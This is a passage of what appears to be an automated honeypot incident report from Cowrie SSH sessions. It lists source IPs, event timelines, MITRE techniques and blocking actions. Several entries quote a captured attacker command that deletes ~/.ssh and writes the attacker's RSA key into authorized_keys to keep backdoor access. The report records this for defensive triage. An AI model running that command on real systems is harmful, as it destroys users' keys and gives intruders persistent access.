| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:48` | `cowrie.session.connect` |
| `2026-07-06 10:22:48` | `cowrie.client.version` |
| `2026-07-06 10:22:48` | `cowrie.client.kex` |
| `2026-07-06 10:22:48` | `cowrie.login.success` |
| `2026-07-06 10:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7237cd605f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:48` | `cowrie.session.connect` |
| `2026-07-06 10:22:48` | `cowrie.client.version` |
| `2026-07-06 10:22:48` | `cowrie.client.kex` |
| `2026-07-06 10:22:48` | `cowrie.login.success` |
| `2026-07-06 10:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40140ad94027

| Field | Detail |
|---|---|
| **Source IP** | `49.204.74[.]149` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:49` | `cowrie.session.connect` |
| `2026-07-06 10:22:49` | `cowrie.client.version` |
| `2026-07-06 10:22:49` | `cowrie.client.kex` |
| `2026-07-06 10:22:50` | `cowrie.login.success` |
| `2026-07-06 10:22:51` | `cowrie.session.params` |
| `2026-07-06 10:22:51` | `cowrie.command.input` |
| `2026-07-06 10:22:51` | `cowrie.command.failed` |
| `2026-07-06 10:22:51` | `cowrie.log.closed` |
| `2026-07-06 10:22:52` | `cowrie.session.params` |
| `2026-07-06 10:22:52` | `cowrie.command.input` |
| `2026-07-06 10:22:52` | `cowrie.session.file_download` |
| `2026-07-06 10:22:52` | `cowrie.log.closed` |
| `2026-07-06 10:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.204.74[.]149` to AbuseIPDB if not already reported
- [ ] Block `49.204.74[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb765ec4b587

| Field | Detail |
|---|---|
| **Source IP** | `49.204.74[.]149` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:53` | `cowrie.session.connect` |
| `2026-07-06 10:22:53` | `cowrie.client.version` |
| `2026-07-06 10:22:53` | `cowrie.client.kex` |
| `2026-07-06 10:22:54` | `cowrie.login.success` |
| `2026-07-06 10:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.204.74[.]149` to AbuseIPDB if not already reported
- [ ] Block `49.204.74[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369bc8de7d4c

| Field | Detail |
|---|---|
| **Source IP** | `49.204.74[.]149` |
| **First Seen** | 2026-07-06 10:22 |
| **Last Seen** | 2026-07-06 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:22:54` | `cowrie.session.connect` |
| `2026-07-06 10:22:54` | `cowrie.client.version` |
| `2026-07-06 10:22:54` | `cowrie.client.kex` |
| `2026-07-06 10:22:55` | `cowrie.login.success` |
| `2026-07-06 10:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.204.74[.]149` to AbuseIPDB if not already reported
- [ ] Block `49.204.74[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceab7bbe1c8d

| Field | Detail |
|---|---|
| **Source IP** | `120.27.128[.]176` |
| **First Seen** | 2026-07-06 10:24 |
| **Last Seen** | 2026-07-06 10:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:24:05` | `cowrie.session.connect` |
| `2026-07-06 10:24:07` | `cowrie.client.version` |
| `2026-07-06 10:24:07` | `cowrie.client.kex` |
| `2026-07-06 10:24:13` | `cowrie.login.success` |
| `2026-07-06 10:24:16` | `cowrie.session.params` |
| `2026-07-06 10:24:16` | `cowrie.command.input` |
| `2026-07-06 10:24:18` | `cowrie.log.closed` |
| `2026-07-06 10:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.27.128[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.27.128[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-423799fb89e2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 10:26 |
| **Last Seen** | 2026-07-06 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:26:46` | `cowrie.session.connect` |
| `2026-07-06 10:26:46` | `cowrie.client.version` |
| `2026-07-06 10:26:46` | `cowrie.client.kex` |
| `2026-07-06 10:26:47` | `cowrie.login.success` |
| `2026-07-06 10:26:47` | `cowrie.direct-tcpip.request` |
| `2026-07-06 10:26:47` | `cowrie.direct-tcpip.data` |
| `2026-07-06 10:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd9cefd0073

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 10:31 |
| **Last Seen** | 2026-07-06 10:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:31:08` | `cowrie.session.connect` |
| `2026-07-06 10:31:09` | `cowrie.client.version` |
| `2026-07-06 10:31:09` | `cowrie.client.kex` |
| `2026-07-06 10:31:16` | `cowrie.login.success` |
| `2026-07-06 10:31:20` | `cowrie.session.params` |
| `2026-07-06 10:31:20` | `cowrie.command.input` |
| `2026-07-06 10:31:21` | `cowrie.log.closed` |
| `2026-07-06 10:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa86e77779a

| Field | Detail |
|---|---|
| **Source IP** | `43.155.40[.]91` |
| **First Seen** | 2026-07-06 10:34 |
| **Last Seen** | 2026-07-06 10:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:34:41` | `cowrie.session.connect` |
| `2026-07-06 10:34:41` | `cowrie.client.version` |
| `2026-07-06 10:34:41` | `cowrie.client.kex` |
| `2026-07-06 10:34:42` | `cowrie.login.success` |
| `2026-07-06 10:34:43` | `cowrie.session.params` |
| `2026-07-06 10:34:43` | `cowrie.command.input` |
| `2026-07-06 10:34:43` | `cowrie.command.failed` |
| `2026-07-06 10:34:44` | `cowrie.log.closed` |
| `2026-07-06 10:34:44` | `cowrie.session.params` |
| `2026-07-06 10:34:44` | `cowrie.command.input` |
| `2026-07-06 10:34:45` | `cowrie.session.file_download` |
| `2026-07-06 10:34:45` | `cowrie.log.closed` |
| `2026-07-06 10:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.40[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.155.40[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7801e033ed26

| Field | Detail |
|---|---|
| **Source IP** | `43.155.40[.]91` |
| **First Seen** | 2026-07-06 10:34 |
| **Last Seen** | 2026-07-06 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:34:45` | `cowrie.session.connect` |
| `2026-07-06 10:34:45` | `cowrie.client.version` |
| `2026-07-06 10:34:45` | `cowrie.client.kex` |
| `2026-07-06 10:34:46` | `cowrie.login.success` |
| `2026-07-06 10:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.40[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.155.40[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd4bfb535285

| Field | Detail |
|---|---|
| **Source IP** | `43.155.40[.]91` |
| **First Seen** | 2026-07-06 10:34 |
| **Last Seen** | 2026-07-06 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:34:47` | `cowrie.session.connect` |
| `2026-07-06 10:34:47` | `cowrie.client.version` |
| `2026-07-06 10:34:47` | `cowrie.client.kex` |
| `2026-07-06 10:34:48` | `cowrie.login.success` |
| `2026-07-06 10:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.40[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.155.40[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726ac10ed37e

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-06 10:37 |
| **Last Seen** | 2026-07-06 10:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:37:20` | `cowrie.session.connect` |
| `2026-07-06 10:37:20` | `cowrie.client.version` |
| `2026-07-06 10:37:20` | `cowrie.client.kex` |
| `2026-07-06 10:37:20` | `cowrie.login.success` |
| `2026-07-06 10:37:21` | `cowrie.session.params` |
| `2026-07-06 10:37:21` | `cowrie.command.input` |
| `2026-07-06 10:37:21` | `cowrie.command.failed` |
| `2026-07-06 10:37:21` | `cowrie.log.closed` |
| `2026-07-06 10:37:22` | `cowrie.session.params` |
| `2026-07-06 10:37:22` | `cowrie.command.input` |
| `2026-07-06 10:37:22` | `cowrie.session.file_download` |
| `2026-07-06 10:37:22` | `cowrie.log.closed` |
| `2026-07-06 10:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49fdbe7ef4f3

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-06 10:37 |
| **Last Seen** | 2026-07-06 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:37:22` | `cowrie.session.connect` |
| `2026-07-06 10:37:22` | `cowrie.client.version` |
| `2026-07-06 10:37:22` | `cowrie.client.kex` |
| `2026-07-06 10:37:22` | `cowrie.login.success` |
| `2026-07-06 10:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32621c0f83f8

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-06 10:37 |
| **Last Seen** | 2026-07-06 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:37:23` | `cowrie.session.connect` |
| `2026-07-06 10:37:23` | `cowrie.client.version` |
| `2026-07-06 10:37:23` | `cowrie.client.kex` |
| `2026-07-06 10:37:23` | `cowrie.login.success` |
| `2026-07-06 10:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df9999b2e75

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 10:39 |
| **Last Seen** | 2026-07-06 10:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:39:05` | `cowrie.session.connect` |
| `2026-07-06 10:39:05` | `cowrie.client.version` |
| `2026-07-06 10:39:05` | `cowrie.client.kex` |
| `2026-07-06 10:39:05` | `cowrie.login.success` |
| `2026-07-06 10:39:05` | `cowrie.direct-tcpip.request` |
| `2026-07-06 10:39:05` | `cowrie.direct-tcpip.data` |
| `2026-07-06 10:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec317421fea

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 10:43 |
| **Last Seen** | 2026-07-06 10:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:43:14` | `cowrie.session.connect` |
| `2026-07-06 10:43:14` | `cowrie.client.version` |
| `2026-07-06 10:43:14` | `cowrie.client.kex` |
| `2026-07-06 10:43:15` | `cowrie.login.success` |
| `2026-07-06 10:43:15` | `cowrie.session.params` |
| `2026-07-06 10:43:15` | `cowrie.command.input` |
| `2026-07-06 10:43:15` | `cowrie.command.failed` |
| `2026-07-06 10:43:16` | `cowrie.log.closed` |
| `2026-07-06 10:43:16` | `cowrie.session.params` |
| `2026-07-06 10:43:16` | `cowrie.command.input` |
| `2026-07-06 10:43:17` | `cowrie.session.file_download` |
| `2026-07-06 10:43:17` | `cowrie.log.closed` |
| `2026-07-06 10:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c5c3a41650

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 10:43 |
| **Last Seen** | 2026-07-06 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:43:17` | `cowrie.session.connect` |
| `2026-07-06 10:43:17` | `cowrie.client.version` |
| `2026-07-06 10:43:17` | `cowrie.client.kex` |
| `2026-07-06 10:43:17` | `cowrie.login.success` |
| `2026-07-06 10:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ea094a696b

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 10:43 |
| **Last Seen** | 2026-07-06 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:43:17` | `cowrie.session.connect` |
| `2026-07-06 10:43:17` | `cowrie.client.version` |
| `2026-07-06 10:43:17` | `cowrie.client.kex` |
| `2026-07-06 10:43:18` | `cowrie.login.success` |
| `2026-07-06 10:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5d022c86095

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 10:43 |
| **Last Seen** | 2026-07-06 10:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:43:20` | `cowrie.session.connect` |
| `2026-07-06 10:43:21` | `cowrie.client.version` |
| `2026-07-06 10:43:21` | `cowrie.client.kex` |
| `2026-07-06 10:43:28` | `cowrie.login.success` |
| `2026-07-06 10:43:31` | `cowrie.session.params` |
| `2026-07-06 10:43:31` | `cowrie.command.input` |
| `2026-07-06 10:43:33` | `cowrie.log.closed` |
| `2026-07-06 10:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4872d1b3d0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 10:43 |
| **Last Seen** | 2026-07-06 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:43:31` | `cowrie.session.connect` |
| `2026-07-06 10:43:31` | `cowrie.client.version` |
| `2026-07-06 10:43:31` | `cowrie.client.kex` |
| `2026-07-06 10:43:32` | `cowrie.login.success` |
| `2026-07-06 10:43:32` | `cowrie.direct-tcpip.request` |
| `2026-07-06 10:43:32` | `cowrie.direct-tcpip.data` |
| `2026-07-06 10:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f01336058f7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 10:54 |
| **Last Seen** | 2026-07-06 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:54:12` | `cowrie.session.connect` |
| `2026-07-06 10:54:12` | `cowrie.client.version` |
| `2026-07-06 10:54:12` | `cowrie.client.kex` |
| `2026-07-06 10:54:12` | `cowrie.login.success` |
| `2026-07-06 10:54:13` | `cowrie.session.params` |
| `2026-07-06 10:54:13` | `cowrie.command.input` |
| `2026-07-06 10:54:13` | `cowrie.log.closed` |
| `2026-07-06 10:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993906a91fb6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 10:55 |
| **Last Seen** | 2026-07-06 10:55 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:55:39` | `cowrie.session.connect` |
| `2026-07-06 10:55:41` | `cowrie.client.version` |
| `2026-07-06 10:55:41` | `cowrie.client.kex` |
| `2026-07-06 10:55:48` | `cowrie.login.success` |
| `2026-07-06 10:55:52` | `cowrie.session.params` |
| `2026-07-06 10:55:52` | `cowrie.command.input` |
| `2026-07-06 10:55:54` | `cowrie.log.closed` |
| `2026-07-06 10:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94b7c78692b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.131[.]10` |
| **First Seen** | 2026-07-06 10:58 |
| **Last Seen** | 2026-07-06 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 10:58:23` | `cowrie.session.connect` |
| `2026-07-06 10:58:23` | `cowrie.login.success` |
| `2026-07-06 10:58:24` | `cowrie.session.params` |
| `2026-07-06 10:58:24` | `cowrie.command.input` |
| `2026-07-06 10:58:24` | `cowrie.command.failed` |
| `2026-07-06 10:58:24` | `cowrie.command.input` |
| `2026-07-06 10:58:24` | `cowrie.log.closed` |
| `2026-07-06 10:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
